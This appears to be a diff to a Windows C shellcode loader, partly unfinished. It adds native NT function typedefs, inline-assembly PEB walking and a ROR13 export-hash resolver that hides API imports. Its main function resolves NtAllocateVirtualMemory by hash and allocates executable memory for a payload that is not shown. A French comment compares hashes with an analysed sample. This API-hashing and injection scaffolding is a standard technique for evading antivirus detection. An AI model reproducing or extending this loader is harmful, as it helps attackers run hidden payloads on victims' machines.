@@ -1,13 +1,57 @@
 #include <windows.h>
 #include <stdio.h>
 
+typedef NTSYSAPI NTSTATUS(NTAPI* NtAlocVirtMem)(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG ZeroBits,
+    PSIZE_T RegionSize,
+    ULONG AllocationType,
+    ULONG Protect
+);
+
+typedef NTSYSAPI NTSTATUS(NTAPI* NtWriteVirtMem)(
+    HANDLE ProcessHandle,
+    PVOID BaseAddress,
+    PVOID Buffer,
+    ULONG NumberOfBytesToWrite,
+    PULONG NumberOfBytesWritten
+);
+
+typedef NTSYSAPI NTSTATUS(NTAPI* NtProtectVirtMem)(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    PSIZE_T NumberOfBytesToProtect,
+    ULONG NewAccessProtection,
+    PULONG OldAccessProtection
+);
+
+typedef NTSYSAPI NTSTATUS(NTAPI* NtCreateThreadEx)(
+    PHANDLE ThreadHandle,
+    ACCESS_MASK DesiredAccess,
+    PCRYPT_ATTRIBUTES ObjectAttributes,
+    HANDLE ProcessHandle,
+    PVOID StartRoutine,
+    PVOID Argument,
+    ULONG CreateFlags,
+    ULONG_PTR ZeroBits,
+    SIZE_T StackSize,
+    SIZE_T MaximumStackSize,
+    PVOID AttributeList
+);
+
+typedef NTSYSAPI NTSTATUS(NTAPI* NtWaitForSingleObject)(
+    HANDLE Handle,
+    BOOLEAN Alertable,
+    PLARGE_INTEGER Timeout
+);
 
 HMODULE CustomGetModuleHandle(unsigned int module_hash) {
     #ifdef _WIN64
         void* module_base = NULL;
-        __asm__ __volatile__ (
+        __asm__ (
             // Initialize r10d with hash and set up PEB access
-            "movl %1, %%r10d\n\t"  
+            "movl %[hash], %%r10d\n\t"  
             "xor %%rdx, %%rdx\n\t"
             "mov %%gs:0x60, %%rdx\n\t"
             "mov 0x18(%%rdx), %%rdx\n\t"
@@ -33,9 +77,9 @@ HMODULE CustomGetModuleHandle(unsigned int module_hash) {
             "mov (%%rdx), %%rdx\n\t"          // Next module
             "jmp load_module_name\n\t"
         "found:\n\t"
-            "mov %%rdx, %0\n\t"               // Store result
-            : "=r" (module_base)              // Output
-            : "r" (module_hash)                // Input
+            "mov %%rdx, %[result]\n\t"            // Store result
+            : [result] "=r" (module_base)              // Output
+            : [hash] "r" (module_hash)                // Input
             : "rax", "rdx", "rsi", "rcx", "r9", "r10", "memory"  // Clobbers
         );
         return module_base;
@@ -45,7 +89,66 @@ HMODULE CustomGetModuleHandle(unsigned int module_hash) {
     #endif
 }
 
+/*
+pour "wcstoul" ROR13
+ce prog me donne 62F36C5A
+internet         6D8B4C5E
+to_analyse.exe   62F36C5A
+*/
 
+FARPROC CustomGetProcAdress(IN HMODULE hModule, unsigned int function_hash) {
+    if (hModule == NULL) {
+        return NULL;
+    }
+    #ifdef _WIN64
+        void* function_base = NULL;
+        __asm__ (
+            // Initialize r10d with hash and set up PEB access
+            "movl %[hash], %%r10d\n\t"  
+            "mov %[module], %%rdx\n\t"  
+            "mov 0x20(%%rdx), %%rdx\n\t"
+            "mov 0x3c(%%rdx), %%eax\n\t"
+            "add %%rdx, %%rax\n\t"
+            "mov 0x88(%%rax), %%eax\n\t"
+            "add %%rdx, %%rax\n\t"
+            "mov 0x18(%%rax), %%ecx\n\t"
+            "mov 0x20(%%rax), %%r8d\n\t"
+            "add %%rdx, %%r8\n\t"
+        "find_function:\n\t"
+            "jrcxz final\n\t"
+            "xor %%r9d, %%r9d\n\t"            // Clear hash accumulator
+            "dec %%rcx\n\t"                   // Decrement number of functions
+            "mov (%%r8, %%rcx, 4), %%esi\n\t" // Load function name RVA
+            "add %%rdx, %%rsi\n\t"            // Calculate function name VA
+        "function_hash_loop:\n\t"
+            "xor %%rax, %%rax\n\t"
+            "lodsb\n\t"                       // Load byte into AL
+            "ror $13, %%r9d\n\t"              // Rotate left by 13 bits
+            "add %%eax, %%r9d\n\t"            // Add AL to hash
+            "cmp %%ah, %%al\n\t"
+            "jnz function_hash_loop\n\t"
+        "next:\n\t"
+            "cmp %%r10d, %%r9d\n\t"           // Compare hash
+            "jnz find_function\n\t"                     // If equal, jump to found
+        "final:\n\t"
+            "mov 0x24(%%rax), %%r8d\n\t"
+            "add %%rdx, %%r8\n\t"
+            "mov (%%r8, %%rcx, 2), %%eax\n\t"
+            "mov 0x1c(%%rax), %%r8d\n\t"
+            "add %%rdx, %%r8\n\t"
+            "mov (%%r8, %%rcx, 4), %%eax\n\t"
+            "add %%rdx, %%rax\n\t"
+            "mov %%rax, %[result]\n\t"
+            : [result] "=r" (function_base)                      // Output
+            : [hash] "r" (function_hash), [module] "r" ((uintptr_t)hModule)                // Input
+            : "rax", "rdx", "rsi", "rcx", "r9", "r10", "memory"  // Clobbers
+        );
+        return function_base;
+    #else
+        // 32-bit code TODO
+        return NULL;
+    #endif
+}
 
 void main() {
 
@@ -69,7 +172,12 @@ void main() {
     DWORD old_protect;
 
     unsigned int ndtll_hash = 0xCCE6C0C4;
+    unsigned int virtual_alloc_hash = 0xD33BCABD; // random hash
     HMODULE hNtdll = CustomGetModuleHandle(ndtll_hash);
+
+    NtAlocVirtMem NtAllocateVirtualMemory = (NtAlocVirtMem)CustomGetProcAdress(hNtdll, virtual_alloc_hash);
+
+
     
     // Allocating executable memory
     exec = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
